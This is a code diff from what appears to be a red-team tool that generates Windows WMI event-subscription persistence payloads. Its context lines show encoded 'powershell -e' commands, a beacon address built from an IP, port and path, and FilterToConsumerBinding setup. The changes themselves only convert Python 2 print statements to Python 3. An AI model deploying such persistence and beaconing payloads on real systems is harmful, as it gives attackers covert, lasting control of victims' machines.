@@ -66,12 +66,12 @@ Once the payload has been generated, either copy and paste the commands into a s
         try:
             interval=int(interval)           
         except:
-            print "Invalid beacon_interval..."
-            print beacon
+            print("Invalid beacon_interval...")
+            print(beacon)
             return
         if (interval < 0) or (interval > 5):
-            print "Invalid beacon_interval..."
-            print beacon
+            print("Invalid beacon_interval...")
+            print(beacon)
             return
          
         interval_setting=""
@@ -96,7 +96,7 @@ Once the payload has been generated, either copy and paste the commands into a s
             encodedmessage = b64encode(messageblock.encode('UTF-16LE'))
             messageblock="\"powershell -e %s \"" % (encodedmessage)
         else:
-            print "use_ssl must be either 'yes' or 'no'"
+            print("use_ssl must be either 'yes' or 'no'")
             return
 
         address=ip + ":" + port + "/" + path
@@ -131,11 +131,11 @@ $x='\\\.\\root\subscription:__FilterToConsumerBinding.Consumer="\\\\\\\\.\\\\roo
 ''' % (filter,consumer,consumer,filter)
         
         if output=='':
-            print data
-            print "\n"
-            print "To Remove"
-            print "---------------------------------"
-            print remove_data
+            print(data)
+            print("\n")
+            print("To Remove")
+            print("---------------------------------")
+            print(remove_data)
             return
         else:
             output="output/"+output
@@ -146,7 +146,7 @@ $x='\\\.\\root\subscription:__FilterToConsumerBinding.Consumer="\\\\\\\\.\\\\roo
             f = open(output,'w')
             f.write(remove_data)
             f.close()
-            print "Files have been written..."
+            print("Files have been written...")
             return
 
 
